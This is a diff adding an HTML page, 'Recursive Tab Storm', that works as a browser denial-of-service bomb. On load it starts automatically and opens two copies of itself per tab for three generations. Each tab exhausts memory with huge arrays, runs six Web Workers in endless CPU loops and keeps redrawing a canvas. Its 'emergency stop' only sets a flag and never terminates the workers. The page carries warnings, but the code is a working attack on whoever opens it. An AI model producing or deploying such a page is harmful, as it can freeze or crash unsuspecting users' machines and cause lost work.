@@ -1,1 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>🔥🔥🤡🔥🔥 Recursive Tab Storm</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 50px; 
+            background: #220000; 
+            color: #ff6666;
+        }
+        h1 { color: #ff4444; }
+        .warning { font-size: 1.3em; color: #ffaa00; font-weight: bold; }
+        button { 
+            padding: 20px 40px; 
+            margin: 15px; 
+            font-size: 1.2em; 
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>Recursive Tab Storm</h1>
+    <p class="warning">⚠️ VERY AGGRESSIVE — EACH TAB SPAWNS MORE TABS<br>Use Task Manager if it gets out of control!</p>
 
+    <button onclick="startRecursiveStorm()">🚀 Start Recursive Storm</button>
+    <button onclick="stopAll()">🛑 EMERGENCY STOP</button>
+
+    <script>
+        let running = true;
+        let generation = 0;
+        const MAX_GEN = 3;           // Don't go above 4
+        const TABS_PER_TAB = 2;
+
+        // Read generation from URL
+        const params = new URLSearchParams(window.location.search);
+        generation = parseInt(params.get('gen') || '0');
+
+        function startRecursiveStorm() {
+            if (!running) return;
+
+            // Start heavy exhaustion in this tab
+            startHeavyExhaustion();
+
+            // Spawn new tabs (limited)
+            if (generation < MAX_GEN) {
+                const newGen = generation + 1;
+                for (let i = 0; i < TABS_PER_TAB; i++) {
+                    setTimeout(() => {
+                        if (running) {
+                            const url = window.location.origin + window.location.pathname + `?gen=${newGen}`;
+                            window.open(url, '_blank');
+                        }
+                    }, i * 600);
+                }
+            }
+        }
+
+        function startHeavyExhaustion() {
+            let workers = [];
+            let bigArrays = [];
+
+            // Memory
+            setInterval(() => {
+                if (!running) return;
+                try {
+                    bigArrays.push(new Array(10_000_000).fill(Math.random()));
+                } catch(e) {}
+            }, 30);
+
+            // CPU Workers
+            for (let i = 0; i < 6; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    self.onmessage = function() {
+                        while (true) {
+                            let x = 0;
+                            for (let i = 0; i < 10_000_000; i++) {
+                                x += Math.sin(i) * Math.sqrt(i);
+                            }
+                        }
+                    };
+                `], { type: 'application/javascript' })));
+                worker.postMessage('start');
+                workers.push(worker);
+            }
+
+            // Canvas
+            const canvas = document.createElement('canvas');
+            canvas.width = 650;
+            canvas.height = 450;
+            document.body.appendChild(canvas);
+            const ctx = canvas.getContext('2d');
+
+            function draw() {
+                if (!running) return;
+                ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
+                ctx.fillRect(Math.random()*650, Math.random()*80, 55, 55);
+                requestAnimationFrame(draw);
+            }
+            draw();
+        }
+
+        function stopAll() {
+            running = false;
+            document.body.innerHTML += '<h2 style="color:lime">Stopped. Close other tabs manually.</h2>';
+        }
+
+        // Auto-start
+        window.addEventListener('load', () => {
+            document.body.innerHTML += `<p style="color:yellow">Generation: ${generation} / ${MAX_GEN}</p>`;
+            setTimeout(startRecursiveStorm, 1000);
+        });
+
+        // Escape key emergency stop
+        document.addEventListener('keydown', e => {
+            if (e.key === "Escape") stopAll();
+        });
+    </script>
+</body>
+</html>
